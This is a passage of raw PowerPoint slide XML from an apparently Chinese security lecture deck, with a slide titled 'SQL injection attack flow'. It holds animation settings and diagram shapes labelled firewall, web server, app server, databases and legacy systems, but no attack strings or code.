                                          <p:spTgt spid="436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6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36227">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="436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6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36227">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4362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36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36227">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4362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62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36227">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="43622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3622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36227">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="49" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="43622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362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436228"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="55" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="436228"/>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436227">
                                            <p:txEl>
                                              <p:pRg st="8" end="8"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="60" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="436227">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43622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r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入攻击流程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437252" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228600" y="914400"/>
            <a:ext cx="5715000" cy="2579688"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DDDDDD"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="900">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437253" name="Line 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="4495800" y="2943225"/>
            <a:ext cx="1066800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437254" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228600" y="3668713"/>
            <a:ext cx="5715000" cy="2579687"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DDDDDD"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437255" name="Line 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="765175" y="5057775"/>
            <a:ext cx="1090613" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437256" name="Line 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1009650" y="3001963"/>
            <a:ext cx="1588" cy="2055812"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437257" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-318816">
            <a:off x="1311275" y="4887913"/>
            <a:ext cx="139700" cy="342900"/>
          </a:xfrm>
          <a:prstGeom prst="parallelogram">
            <a:avLst>
              <a:gd name="adj" fmla="val 56324"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437258" name="Line 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="1330325" y="4946650"/>
            <a:ext cx="49213" cy="258763"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437259" name="Line 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="1379538" y="4946650"/>
            <a:ext cx="50800" cy="258763"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437260" name="Rectangle 12"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000" flipH="1">
            <a:off x="889000" y="5230813"/>
            <a:ext cx="1631950" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC3300"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
          <a:scene3d>
            <a:camera prst="legacyPerspectiveTopRight"/>
            <a:lightRig rig="legacyFlat3" dir="b"/>
          </a:scene3d>
          <a:sp3d extrusionH="3630600" prstMaterial="legacyPlastic">
            <a:bevelT w="13500" h="13500" prst="angle"/>
            <a:bevelB w="13500" h="13500" prst="angle"/>
            <a:extrusionClr>
              <a:srgbClr val="CC3300"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:flatTx/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Firewall</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437261" name="AutoShape 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="1609725" y="4935538"/>
            <a:ext cx="668337" cy="153988"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 36056"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437262" name="Line 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1968500" y="5043488"/>
            <a:ext cx="2063750" cy="14287"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437263" name="Freeform 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1073150" y="2979738"/>
            <a:ext cx="511175" cy="1927225"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="68" y="0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="68" y="775"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="479" y="980"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="479" h="980">
                <a:moveTo>
                  <a:pt x="68" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="33" y="304"/>
                  <a:pt x="0" y="612"/>
                  <a:pt x="68" y="775"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="136" y="938"/>
                  <a:pt x="393" y="937"/>
                  <a:pt x="479" y="980"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="101600" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000">
                <a:alpha val="60001"/>
              </a:srgbClr>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="none" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437264" name="Line 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2989263" y="4414838"/>
            <a:ext cx="0" cy="601662"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437265" name="AutoShape 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801938" y="4356100"/>
            <a:ext cx="388937" cy="515938"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 33163"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437266" name="Rectangle 18"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2368550" y="4489450"/>
            <a:ext cx="1227138" cy="268288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Hardened OS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437267" name="Rectangle 19"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2354263" y="4156075"/>
            <a:ext cx="1228725" cy="268288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web Server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437268" name="Rectangle 20"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm>
            <a:off x="2354263" y="3813175"/>
            <a:ext cx="1228725" cy="268288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC33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CC3300"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:flatTx/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>App Server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437269" name="AutoShape 21"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801938" y="3554413"/>
            <a:ext cx="385762" cy="171450"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 36056"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437270" name="Line 22"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="2995613" y="3233738"/>
            <a:ext cx="1587" cy="388937"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437271" name="Rectangle 23"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000" flipH="1">
            <a:off x="3292475" y="5203825"/>
            <a:ext cx="1631950" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC3300"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
          <a:scene3d>
            <a:camera prst="legacyPerspectiveTopRight"/>
            <a:lightRig rig="legacyFlat3" dir="b"/>
          </a:scene3d>
          <a:sp3d extrusionH="3630600" prstMaterial="legacyPlastic">
            <a:bevelT w="13500" h="13500" prst="angle"/>
            <a:bevelB w="13500" h="13500" prst="angle"/>
            <a:extrusionClr>
              <a:srgbClr val="CC3300"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:flatTx/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Firewall</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437272" name="AutoShape 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="4012407" y="4933156"/>
            <a:ext cx="666750" cy="150813"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 36056"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437273" name="Line 25"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="4362450" y="5053013"/>
            <a:ext cx="1033463" cy="1587"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="127000">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437274" name="Rectangle 26"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="3846513" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>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Databases</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437275" name="Rectangle 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="ltGray">
          <a:xfrm rot="16200000">
            <a:off x="4044950" y="2063750"/>
            <a:ext cx="1371600" cy="139700"/>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Legacy Systems</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:solidFill>
                <a:srgbClr val="000000"/>
